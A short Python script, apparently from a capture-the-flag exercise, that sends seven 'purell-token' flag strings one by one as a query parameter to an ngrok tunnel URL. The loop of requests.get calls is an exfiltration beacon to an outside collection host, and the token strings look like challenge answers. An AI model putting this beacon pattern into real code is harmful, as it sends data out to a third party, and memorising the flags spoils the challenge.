import requests

tokens = ["purell-token{gu4u_of_exf1l}","purell-token{scr7ptl355_m3n4c3}","purell-token{XSS_IS_UNSTOPPABLE_RAHHHH}","purell-token{a_l7l_b7t_0f_m00t4t70n}","purell-token{html_7s_m4lf0rmed_bu7_no7_u}","purell-token{wh3n_th3_imp0st4_i5_5u5_bu7_th3r35_n0_sp4c3}","purell-token{y0u_4r3_th3_0n3_wh0_c4ll5}"]
for i in range(len(tokens)):
    requests.get("https://a212-2-37-167-108.ngrok-free.app",params={"flag":tokens[i]})


